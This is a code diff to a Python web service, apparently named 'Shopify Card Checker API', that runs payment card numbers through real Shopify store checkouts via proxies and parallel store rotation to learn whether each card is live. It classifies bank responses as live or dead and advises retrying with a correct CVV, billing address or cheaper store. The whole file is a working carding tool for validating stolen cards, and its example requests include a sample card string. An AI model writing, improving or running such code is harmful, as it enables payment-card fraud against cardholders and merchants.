-        return running_total, "APPROVED LIVE - Bank confirmed card is live. Balance too low for this amount.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}
+        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': 'INSUFFICIENT_FUNDS', 'iso': 'ISO 51', 'meaning': 'Bank confirmed card is LIVE. Balance too low for this cart total. Retry on a cheaper store or after deposit.'}
+    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc', 'cvv_failure', 'cvv_fail']):
+        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': 'INVALID_CVV', 'iso': '', 'meaning': 'Card LIVE. CVV was wrong. Retry with correct CVV.'}
+    if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
+        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': 'AVS_FAILURE', 'iso': '', 'meaning': 'Card LIVE. Address mismatch. Retry with correct billing address.'}
 
-    # RULE 4: DECLINED codes — the ONLY codes that produce DECLINED
-    DECLINED_HARD = {
-        'stolen_card': 'Bank says card is reported stolen. Do not use.',
-        'lost_card': 'Bank says card is reported lost. Do not use.',
-        'expired_card': 'Card expiry is in the past. Card dead.',
-        'card_expired': 'Card expiry is in the past. Card dead.',
-        'invalid_account': 'Bank says account does not exist or is closed. Card dead.',
-        'pickup_card': 'Bank wants card retained. Do not use.',
-        'fraudulent': 'Bank flagged card for fraud. Do not use.',
-        'fraud_suspected': 'Bank flagged card for fraud. Do not use.',
-        'security_violation': 'Security violation. Card may be compromised.',
-        'card_not_supported': 'Brand not accepted by store.',
+    # ── DECLINED — bank/processor refused ──────────────────────────────
+    DECLINED_LIVE_CODES = {
+        'EXCEEDS_LIMIT': 'Over per-transaction limit.',
+        'VELOCITY_LIMIT': 'Too many recent attempts.',
+        'CARD_VELOCITY_EXCEEDED': 'Too many recent attempts.',
+        'WITHDRAWAL_COUNT_LIMIT_EXCEEDED': 'Too many recent attempts.',
+        'DO_NOT_HONOR': 'Bank refused silently.',
+        'CARD_DECLINED': 'Bank declined the card.',
+        'GENERIC_DECLINE': 'Bank declined the card.',
+        'GENERIC_ERROR': 'Card declined by payment processor.',
+        'APPROVE_WITH_ID': 'Approved but needs verification.',
+        'CALL_ISSUER': 'Bank says call issuer.',
     }
-    DECLINED_SOFT = {
-        'do_not_honor': 'Bank refused the transaction.',
-        'card_declined': 'Generic decline. Bank refused.',
-        'generic_decline': 'Generic decline. Bank refused.',
-        'velocity_limit': 'Too many recent attempts.',
-        'card_velocity_exceeded': 'Too many recent attempts.',
-        'exceeds_limit': 'Over per-transaction limit.',
-        'withdrawal_count_limit_exceeded': 'Too many recent attempts.',
-        'restricted_card': 'Merchant category restricted.',
-        'not_permitted': 'Merchant category blocked.',
-        'transaction_not_allowed': 'Merchant category blocked.',
-        'approve_with_id': 'Approved but needs verification.',
-        'call_issuer': 'Bank says call issuer.',
-        'pin_attempts': 'Too many PIN tries.',
+    if code_upper in DECLINED_LIVE_CODES:
+        return running_total, "DECLINED", gw_name, {'amount': running_total, 'verdict': 'DECLINED', 'code': code_upper, 'iso': iso, 'meaning': DECLINED_LIVE_CODES[code_upper]}
+
+    # ── DECLINED · DEAD — hard decline, card is finished ─────────────────
+    DECLINED_DEAD_CODES = {
+        'STOLEN_CARD': 'Card reported stolen. Do not use.',
+        'LOST_CARD': 'Card reported lost. Do not use.',
+        'EXPIRED_CARD': 'Card expiry is in the past. Card dead.',
+        'CARD_EXPIRED': 'Card expiry is in the past. Card dead.',
+        'INVALID_ACCOUNT': 'Account invalid or closed. Card dead.',
+        'FRAUD_SUSPECTED': 'Bank flagged card for fraud. Do not use.',
+        'FRAUDULENT': 'Bank flagged card for fraud. Do not use.',
+        'PICKUP_CARD': 'Bank wants card retained. Do not use.',
+        'SECURITY_VIOLATION': 'Security violation. Card may be compromised.',
     }
+    if code_upper in DECLINED_DEAD_CODES:
+        return running_total, "DECLINED DEAD", gw_name, {'amount': running_total, 'verdict': 'DECLINED_DEAD', 'code': code_upper, 'iso': iso, 'meaning': DECLINED_DEAD_CODES[code_upper]}
 
-    for k, reason in DECLINED_HARD.items():
-        if k in tl:
-            return running_total, f"DECLINED HARD - {reason}", gw_name, {'amount': running_total, 'verdict': 'DECLINED_HARD', 'code': code}
-    for k, reason in DECLINED_SOFT.items():
-        if k in tl:
-            return running_total, f"DECLINED SOFT - {reason}", gw_name, {'amount': running_total, 'verdict': 'DECLINED_SOFT', 'code': code}
+    # ── DECLINED (plain) — merchant/category issues, not card-dead ───────
+    DECLINED_PLAIN_CODES = {
+        'RESTRICTED_CARD': 'Merchant category restricted.',
+        'TXN_NOT_PERMITTED': 'Merchant category blocked.',
+        'NOT_PERMITTED': 'Merchant category blocked.',
+        'TRANSACTION_NOT_ALLOWED': 'Merchant category blocked.',
+        'CARD_NOT_SUPPORTED': 'Brand not accepted by store.',
+        'PIN_ATTEMPTS': 'Too many PIN tries.',
+    }
+    if code_upper in DECLINED_PLAIN_CODES:
+        return running_total, "DECLINED", gw_name, {'amount': running_total, 'verdict': 'DECLINED', 'code': code_upper, 'iso': iso, 'meaning': DECLINED_PLAIN_CODES[code_upper]}
 
-    # RULE 5: UNTESTED codes — bank never spoke
+    # ── UNTESTED — Shopify gateway failure, bank never spoke ─────────────
     UNTESTED_EXACT = {
-        'generic_error': 'Gateway failed. Bank never responded. Card untested.',
         'processing_error': 'Bank processing error. Bank never responded. Card untested.',
         'try_again_later': 'Bank says try again later. Bank never responded. Card untested.',
         'system_malfunction': 'System malfunction. Bank never responded. Card untested.',
@@ -658,21 +877,21 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     }
     for k, reason in UNTESTED_EXACT.items():
         if k in tl:
-            return None, f"UNTESTED - {reason}", gw_name, {'verdict': 'UNTESTED', 'code': code}
+            return None, f"UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': code_upper, 'iso': '', 'meaning': reason}
 
     # UNTESTED prefixes — any code starting with these is NOT a bank code
     UNTESTED_PREFIXES = ['delivery_', 'payments_', 'negotiation_', 'checkout_', 'session_', 'cart_', 'vault_', 'token_', 'invalid_variable', 'validation_', 'artifact_', 'input_']
     for prefix in UNTESTED_PREFIXES:
         if code_lower.startswith(prefix):
-            return None, f"UNTESTED - {code}: Shopify/gateway error. Bank never responded. Card untested.", gw_name, {'verdict': 'UNTESTED', 'code': code}
+            return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': code_upper, 'iso': '', 'meaning': f'{code_upper}: Shopify/gateway error. Bank never responded. Card untested.'}
 
     # No code at all → UNTESTED
     if not code or code_lower in ('', 'unknown', 'null', 'none'):
-        return None, "UNTESTED - No bank response received. Bank never spoke.", gw_name, {'verdict': 'UNTESTED'}
+        return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': '', 'iso': '', 'meaning': 'No bank response received. Bank never spoke.'}
 
-    # Unknown code but card reached the bank = APPROVED LIVE
-    # (bank confirmed the card exists by returning a code we didn't recognize)
-    return running_total, f"APPROVED LIVE - Card reached bank, code: {code}. Bank confirmed card exists.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}
+    # Unknown code but card reached the bank = DECLINED
+    # (bank returned a code we didn't recognize — it spoke, so card was tested)
+    return running_total, "DECLINED", gw_name, {'amount': running_total, 'verdict': 'DECLINED', 'code': code_upper, 'iso': '', 'meaning': f'Bank returned unknown code {code_upper}.'}
 
 
 async def check_card(cc, mm, yy, cvv, site=None, sites=None, proxy=None):
@@ -696,83 +915,390 @@ async def check_card(cc, mm, yy, cvv, site=None, sites=None, proxy=None):
     if requested_site:
         sites_to_try = [requested_site]
     elif sites:
-        cleaned = [s.replace("https://", "").replace("http://", "").rstrip("/") for s in sites if s]
+        cleaned = []
+        for s in sites:
+            if not s:
+                continue
+            s_clean = s.replace("https://", "").replace("http://", "").rstrip("/")
+            # Filter out proxy-like entries (host:port:user:pass format)
+            if s_clean.count(":") >= 3:
+                continue
+            # Filter out non-shopify entries
+            if "." not in s_clean:
+                continue
+            cleaned.append(s_clean)
         random.shuffle(cleaned)
-        sites_to_try = cleaned[:5]
+        sites_to_try = cleaned[:15]
     else:
-        fallback = SHOPIFY_SITES.copy()
-        random.shuffle(fallback)
-        sites_to_try = fallback[:5]
+        # No sites provided — can't check without sites
+        elapsed = round(time.time() - start, 2)
+        return {"status": "error", "response": "UNTESTED", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed, "verdict": "UNTESTED", "code": "NO_SITES", "iso": "", "meaning": "No sites provided. Add sites via /addsite in bot."}
 
-    async def _try_sites(site_list, use_proxy):
-        for s in site_list:
-            logger.info(f"Checking {card_short} on {s} proxy={use_proxy is not None}")
-            try:
-                kw = {"timeout": aiohttp.ClientTimeout(total=10, connect=5, sock_connect=5, sock_read=8), "connector": aiohttp.TCPConnector(ssl=False, limit=0, force_close=True)}
-                if use_proxy:
-                    kw["proxy"] = use_proxy
-                async with aiohttp.ClientSession(**kw) as session:
-                    result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=12)
-                    amount, response, gw_name = result[0], result[1], result[2]
-                    extra = result[3] if len(result) > 3 else None
-                    elapsed_now = round(time.time() - start, 2)
+    async def _try_one_site(s, use_proxy):
+        """Try one site, return result dict or None."""
+        logger.info(f"Checking {card_short} on {s} proxy={use_proxy is not None}")
+        try:
+            kw = {"timeout": aiohttp.ClientTimeout(total=12, connect=4, sock_connect=4, sock_read=8), "connector": aiohttp.TCPConnector(ssl=False, limit=0, force_close=True)}
+            if use_proxy:
+                kw["proxy"] = use_proxy
+            async with aiohttp.ClientSession(**kw) as session:
+                result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=15)
+                amount, response, gw_name = result[0], result[1], result[2]
+                extra = result[3] if len(result) > 3 else None
+                elapsed_now = round(time.time() - start, 2)
+                verdict = extra.get('verdict', '') if extra else ''
 
-                    verdict = extra.get('verdict', '') if extra else ''
+                # UNTESTED = bank never saw the card → try next site
+                # But DECLINED = bank DID respond → return immediately
+                if verdict == 'UNTESTED' or (response and response.startswith('UNTESTED')):
+                    logger.info(f"UNTESTED {s}: {response}")
+                    return None
 
-                    # UNTESTED = bank never saw the card → try next site
-                    if verdict == 'UNTESTED' or (response and response.startswith('UNTESTED')):
-                        logger.info(f"UNTESTED {s}: {response} — trying next site")
-                        continue
+                # If we got a verdict from the bank (APPROVED/DECLINED), return it
+                if verdict and verdict != 'UNTESTED':
+                    r_code = extra.get('code', '') if extra else ''
+                    r_iso = extra.get('iso', '') if extra else ''
+                    r_meaning = extra.get('meaning', '') if extra else ''
+                    r_order_id = extra.get('order_id', '') if extra else ''
+                    return {"status": "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed_now, "verdict": verdict, "code": r_code, "iso": r_iso, "meaning": r_meaning, "order_id": r_order_id}
 
-                    # Chain failures → try next site
-                    chain_failures = ["no products", "no session", "no shipping", "checkpoint", "login", "password", "throttled", "gateway error", "negotiation", "no receipt", "invalid card", "no seller", "failed to add", "failed to create", "site requires", "payment method unavailable", "processing error"]
-                    if response and any(k in response.lower() for k in chain_failures):
-                        logger.info(f"CHAIN FAIL {s}: {response} — trying next site")
-                        continue
+                # Chain failures
+                chain_failures = ["no products", "no session", "no shipping", "checkpoint", "login", "password", "throttled", "gateway error", "negotiation", "no receipt", "invalid card", "no seller", "failed to add", "failed to create", "site requires", "payment method unavailable", "processing error"]
+                if response and any(k in response.lower() for k in chain_failures):
+                    logger.info(f"CHAIN FAIL {s}: {response}")
+                    return None
 
-                    if _is_fake_gateway(gw_name):
-                        continue
+                if _is_fake_gateway(gw_name):
+                    return None
 
-                    return {"status": "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed_now, "verdict": verdict}
-            except asyncio.TimeoutError:
-                logger.info(f"TIMEOUT {s}")
-                continue
-            except Exception as e:
-                logger.info(f"ERROR {s}: {str(e)[:80]}")
-                continue
+                return {"status": "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed_now, "verdict": verdict}
+        except asyncio.TimeoutError:
+            logger.info(f"TIMEOUT {s}")
+            return None
+        except Exception as e:
+            logger.info(f"ERROR {s}: {str(e)[:80]}")
+            return None
+
+    async def _try_sites_parallel(site_list, use_proxy, max_concurrent=5):
+        """Try all sites in parallel, return first real result."""
+        semaphore = asyncio.Semaphore(max_concurrent)
+        async def _guarded(s):
+            async with semaphore:
+                return await _try_one_site(s, use_proxy)
+        tasks = [asyncio.create_task(_guarded(s)) for s in site_list]
+        pending = set(tasks)
+        while pending:
+            done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
+            for t in done:
+                r = t.result()
+                if r:
+                    # Cancel all remaining tasks
+                    for p in pending:
+                        p.cancel()
+                    return r
         return None
 
-    result = await _try_sites(sites_to_try, proxy_url)
+    # Try user sites in parallel
+    result = await _try_sites_parallel(sites_to_try, proxy_url)
     if result:
         return result
 
-    if sites_to_try and not requested_site:
-        fallback = SHOPIFY_SITES.copy()
-        random.shuffle(fallback)
-        fallback_clean = [s for s in fallback[:3] if s not in sites_to_try]
-        result = await _try_sites(fallback_clean, proxy_url)
-        if result:
-            return result
-
+    # If proxy failed all user sites, retry WITHOUT proxy using user sites
     if proxy_url:
-        logger.info(f"All sites failed with proxy, retrying WITHOUT proxy...")
-        all_sites = sites_to_try + [s for s in SHOPIFY_SITES if s not in sites_to_try][:3]
-        random.shuffle(all_sites)
-        result = await _try_sites(all_sites[:5], None)
+        logger.info(f"Proxy failed all sites, retrying WITHOUT proxy...")
+        result = await _try_sites_parallel(sites_to_try[:8], None)
         if result:
             return result
 
     elapsed = round(time.time() - start, 2)
-    return {"status": "error", "response": "All sites failed", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed}
+    return {"status": "error", "response": "UNTESTED", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed, "verdict": "UNTESTED", "code": "", "iso": "", "meaning": "All sites failed before reaching bank. Bank never responded."}
 
 
 @app.get("/")
 async def root():
-    return {"status": "running", "service": "Shopify Card Checker API"}
+    return {
+        "status": "running",
+        "service": "Shopify Card Checker API",
+        "endpoints": {
+            "GET /shopify": "Live card checker (params: site, cc, proxy)",
+            "GET /check": "Site health checker (params: site, cc, proxy)",
+            "GET /health": "Health check",
+            "GET /status": "API status and info",
+            "GET /sites": "List available sites",
+        },
+    }
 
 @app.get("/health")
 async def health():
-    return {"status": "ok"}
+    return {"status": "ok", "service": "Shopify Card Checker API", "uptime": "active"}
+
+@app.get("/status")
+async def status():
+    return {
+        "status": "online",
+        "service": "Shopify Card Checker API",
+        "sites": "managed by bot via /addsite",
+        "verdicts": ["APPROVED_CHARGED", "APPROVED_LIVE", "APPROVED_3DS", "DECLINED", "DECLINED_DEAD", "UNTESTED"],
+        "endpoints": {
+            "GET /shopify": "Live card checker (params: site, cc, proxy)",
+            "GET /check": "Site health checker (params: site, cc, proxy)",
+            "GET /health": "Health check",
+            "GET /status": "API status and info",
+            "GET /sites": "Site info",
+        },
+    }
+
+@app.get("/sites")
+async def get_sites():
+    return {"message": "Sites are managed by the bot via /addsite. Use the bot to add and view sites."}
+
+# ── GET /shopify — Live Card Checker ──────────────────────────────────────
+@app.get("/shopify")
+async def shopify_get(site: str = None, cc: str = None, proxy: str = None):
+    if not site or not cc:
+        return {"error": "Missing required params: site, cc", "example": "/shopify?site=biggerfive.myshopify.com&cc=5555608113587131|04|28|896&proxy=ip:port:user:pass"}
+    
+    # Parse card from cc|mm|yy|cvv format
+    parts = cc.split("|")
+    if len(parts) != 4:
+        return {"error": "Invalid card format. Use: cc|mm|yy|cvv"}
+    card_num, mm, yy, cvv = parts
+    if len(yy) == 4:
+        yy = yy[2:]
+    mm = mm.zfill(2)
+    
+    check_start = time.monotonic()
+    logger.info(f"[shopify] {card_num} on {site} proxy={bool(proxy)} - start")
+    
+    try:
+        result = await asyncio.wait_for(
+            check_card(card_num, mm, yy, cvv, site=site, proxy=proxy),
+            timeout=40
+        )
+    except asyncio.TimeoutError:
+        elapsed = time.monotonic() - check_start
+        return {
+            "Response": "UNTESTED",
+            "CC": cc,
+            "Price": "N/A",
+            "Gate": "Shopify Payments",
+            "Site": site,
+            "Charged": "False",
+            "Approved": "False",
+            "Time": f"{elapsed:.1f}s",
+        }
+    except Exception as e:
+        elapsed = time.monotonic() - check_start
+        return {
+            "Response": "UNTESTED",
+            "CC": cc,
+            "Price": "N/A",
+            "Gate": "Shopify Payments",
+            "Site": site,
+            "Charged": "False",
+            "Approved": "False",
+            "Time": f"{elapsed:.1f}s",
+        }
+    
+    elapsed = time.monotonic() - check_start
+    verdict = result.get("verdict", "")
+    code = result.get("code", "")
+    amount = result.get("amount", "N/A")
+    gw = result.get("gateway", "Shopify Payments")
+    result_site = result.get("site", site)
+    
+    charged = "True" if verdict == "APPROVED_CHARGED" else "False"
+    approved = "True" if verdict in ("APPROVED_CHARGED", "APPROVED_LIVE", "APPROVED_3DS") else "False"
+    
+    # Map generic codes to user-friendly names
+    RESPONSE_DISPLAY_MAP = {
+        'GENERIC_ERROR': 'CARD_DECLINED',
+        'GENERIC_DECLINE': 'CARD_DECLINED',
+        'CARD_DECLINED': 'CARD_DECLINED',
+        'DO_NOT_HONOR': 'DO_NOT_HONOR',
+        'INSUFFICIENT_FUNDS': 'INSUFFICIENT_FUNDS',
+        'INVALID_CVV': 'INVALID_CVV',
+        'CVV_FAILURE': 'INVALID_CVV',
+        'INCORRECT_CVC': 'INVALID_CVV',
+        'AVS_FAILURE': 'AVS_FAILURE',
+        'STOLEN_CARD': 'STOLEN_CARD',
+        'LOST_CARD': 'LOST_CARD',
+        'EXPIRED_CARD': 'EXPIRED_CARD',
+        'CARD_EXPIRED': 'EXPIRED_CARD',
+        'INVALID_ACCOUNT': 'INVALID_ACCOUNT',
+        'FRAUD_SUSPECTED': 'FRAUD_SUSPECTED',
+        'PICKUP_CARD': 'PICKUP_CARD',
+        'VELOCITY_LIMIT': 'VELOCITY_LIMIT',
+        'EXCEEDS_LIMIT': 'EXCEEDS_LIMIT',
+        'RESTRICTED_CARD': 'RESTRICTED_CARD',
+        'ORDER_CREATED': 'ORDER_CREATED',
+        '3DS_REQUIRED': '3DS_REQUIRED',
+    }
+    display_code = RESPONSE_DISPLAY_MAP.get(code, code) if code else result.get("response", "UNKNOWN")
+    
+    return {
+        "Response": display_code,
+        "CC": cc,
+        "Price": str(amount) if amount else "N/A",
+        "Gate": gw,
+        "Site": result_site or site,
+        "Charged": charged,
+        "Approved": approved,
+        "Time": f"{elapsed:.1f}s",
+    }
+
+# ── GET /check — Site Health Checker ──────────────────────────────────────
+@app.get("/check")
+async def check_get(site: str = None, cc: str = None, proxy: str = None):
+    if not site or not cc:
+        return {"error": "Missing required params: site, cc", "example": "/check?site=biggerfive.myshopify.com&cc=5555608113587131|04|28|896&proxy=ip:port:user:pass"}
+    
+    # Parse card
+    parts = cc.split("|")
+    if len(parts) != 4:
+        return {"error": "Invalid card format. Use: cc|mm|yy|cvv"}
+    card_num, mm, yy, cvv = parts
+    if len(yy) == 4:
+        yy = yy[2:]
+    mm = mm.zfill(2)
+    
+    clean_site = site.replace("https://", "").replace("http://", "").rstrip("/")
+    
+    # First check if site is alive and has products
+    valid = False
+    product_name = "N/A"
+    product_price = "N/A"
+    
+    proxy_url = None
+    if proxy and proxy != "NONE":
+        p = proxy.strip()
+        if p.startswith("http://") or p.startswith("https://"):
+            proxy_url = p
+        elif ":" in p:
+            pparts = p.split(":")
+            if len(pparts) == 4:
+                proxy_url = f"http://{pparts[2]}:{pparts[3]}@{pparts[0]}:{pparts[1]}"
+            elif len(pparts) == 2:
+                proxy_url = f"http://{pparts[0]}:{pparts[1]}"
+    
+    try:
+        kw = {"timeout": aiohttp.ClientTimeout(total=10), "connector": aiohttp.TCPConnector(ssl=False, force_close=True)}
+        if proxy_url:
+            kw["proxy"] = proxy_url
+        async with aiohttp.ClientSession(**kw) as session:
+            # Check if site has products
+            for endpoint in [f"https://{clean_site}/collections/all/products.json?limit=5", f"https://{clean_site}/products.json?limit=5"]:
+                try:
+                    async with session.get(endpoint, headers={"User-Agent": _get_ua(), "Accept": "application/json"}, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+                        if resp.status == 200:
+                            data = await resp.json(content_type=None)
+                            product = _parse_products(data)
+                            if product:
+                                valid = True
+                                product_price = product["price"]
+                                # Try to get product name
+                                try:
+                                    prods = data.get("products", [])
+                                    if prods:
+                                        product_name = prods[0].get("title", "N/A")[:50]
+                                except Exception:
+                                    pass
+                                break
+                except Exception:
+                    continue
+    except Exception:
+        pass
+    
+    if not valid:
+        return {
+            "valid": False,
+            "site": site,
+            "product": "N/A",
+            "price": "N/A",
+            "card_response": "SITE_DEAD",
+            "gate": "N/A",
+            "approved": "False",
+            "charged": "False",
+            "time": "0.0s",
+        }
+    
+    # Now check the card
+    check_start = time.monotonic()
+    try:
+        result = await asyncio.wait_for(
+            check_card(card_num, mm, yy, cvv, site=clean_site, proxy=proxy),
+            timeout=40
+        )
+    except asyncio.TimeoutError:
+        elapsed = time.monotonic() - check_start
+        return {
+            "valid": True,
+            "site": site,
+            "product": product_name,
+            "price": product_price,
+            "card_response": "UNTESTED",
+            "gate": "Shopify Payments",
+            "approved": "False",
+            "charged": "False",
+            "time": f"{elapsed:.1f}s",
+        }
+    except Exception as e:
+        elapsed = time.monotonic() - check_start
+        return {
+            "valid": True,
+            "site": site,
+            "product": product_name,
+            "price": product_price,
+            "card_response": "UNTESTED",
+            "gate": "Shopify Payments",
+            "approved": "False",
+            "charged": "False",
+            "time": f"{elapsed:.1f}s",
+        }
+    
+    elapsed = time.monotonic() - check_start
+    verdict = result.get("verdict", "")
+    code = result.get("code", "")
+    gw = result.get("gateway", "Shopify Payments")
+    charged = "True" if verdict == "APPROVED_CHARGED" else "False"
+    approved = "True" if verdict in ("APPROVED_CHARGED", "APPROVED_LIVE", "APPROVED_3DS") else "False"
+    
+    RESPONSE_DISPLAY_MAP = {
+        'GENERIC_ERROR': 'CARD_DECLINED',
+        'GENERIC_DECLINE': 'CARD_DECLINED',
+        'CARD_DECLINED': 'CARD_DECLINED',
+        'DO_NOT_HONOR': 'DO_NOT_HONOR',
+        'INSUFFICIENT_FUNDS': 'INSUFFICIENT_FUNDS',
+        'INVALID_CVV': 'INVALID_CVV',
+        'CVV_FAILURE': 'INVALID_CVV',
+        'INCORRECT_CVC': 'INVALID_CVV',
+        'AVS_FAILURE': 'AVS_FAILURE',
+        'STOLEN_CARD': 'STOLEN_CARD',
+        'LOST_CARD': 'LOST_CARD',
+        'EXPIRED_CARD': 'EXPIRED_CARD',
+        'CARD_EXPIRED': 'EXPIRED_CARD',
+        'INVALID_ACCOUNT': 'INVALID_ACCOUNT',
+        'FRAUD_SUSPECTED': 'FRAUD_SUSPECTED',
+        'PICKUP_CARD': 'PICKUP_CARD',
+        'VELOCITY_LIMIT': 'VELOCITY_LIMIT',
+        'EXCEEDS_LIMIT': 'EXCEEDS_LIMIT',
+        'RESTRICTED_CARD': 'RESTRICTED_CARD',
+        'ORDER_CREATED': 'ORDER_CREATED',
+        '3DS_REQUIRED': '3DS_REQUIRED',
+    }
+    display_code = RESPONSE_DISPLAY_MAP.get(code, code) if code else result.get("response", "UNKNOWN")
+    
+    return {
+        "valid": True,
+        "site": site,
+        "product": product_name,
+        "price": product_price,
+        "card_response": display_code,
+        "gate": gw,
+        "approved": approved,
+        "charged": charged,
+        "time": f"{elapsed:.1f}s",
+    }
 
 @app.post("/check")
 async def check(req: CheckRequest):
@@ -786,55 +1312,59 @@ async def check(req: CheckRequest):
     try:
         result = await asyncio.wait_for(
             check_card(req.cc, req.mm, req.yy, req.cvv, site=req.site, sites=req.sites, proxy=req.proxy),
-            timeout=35
+            timeout=40
         )
     except asyncio.TimeoutError:
         elapsed = time.monotonic() - check_start
-        logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (35s hard timeout)")
+        logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (40s hard timeout)")
         return {
             "status": "error",
-            "response": "UNTESTED - Hard 35s timeout. Store or proxy too slow. Bank never responded.",
+            "response": "UNTESTED",
             "gateway": "Shopify Payments",
             "amount": None,
             "site": req.site or None,
             "elapsed": round(elapsed, 2),
             "verdict": "UNTESTED",
+            "code": "",
+            "iso": "",
+            "meaning": "Hard 40s timeout. Store or proxy too slow. Bank never responded.",
         }
     except asyncio.CancelledError:
         elapsed = time.monotonic() - check_start
         logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (cancelled)")
         return {
             "status": "error",
-            "response": "UNTESTED - Request cancelled. Bank never responded.",
+            "response": "UNTESTED",
             "gateway": "Shopify Payments",
             "amount": None,
             "site": req.site or None,
             "elapsed": round(elapsed, 2),
             "verdict": "UNTESTED",
+            "code": "CANCELLED",
+            "iso": "",
+            "meaning": "Request cancelled. Bank never responded.",
         }
     except Exception as e:
         elapsed = time.monotonic() - check_start
         logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (error: {str(e)[:80]})")
         return {
             "status": "error",
-            "response": f"UNTESTED - Error: {str(e)[:80]}. Bank never responded.",
+            "response": "UNTESTED",
             "gateway": "Shopify Payments",
             "amount": None,
             "site": req.site or None,
             "elapsed": round(elapsed, 2),
             "verdict": "UNTESTED",
+            "code": "INTERNAL_ERROR",
+            "iso": "",
+            "meaning": f"Error: {str(e)[:80]}. Bank never responded.",
         }
     
     elapsed = time.monotonic() - check_start
     logger.info(f"[check] {req.cc} verdict={result.get('verdict', '?')} elapsed={elapsed:.1f}s")
     return result
 
-@app.get("/sites")
-async def get_sites():
-    return {"sites": SHOPIFY_SITES, "count": len(SHOPIFY_SITES)}
-
-
 if __name__ == "__main__":
     import uvicorn
-    port = int(os.environ.get("PORT", 8080))
+    port = int(os.environ.get("PORT", 8081))
     uvicorn.run(app, host="0.0.0.0", port=port)
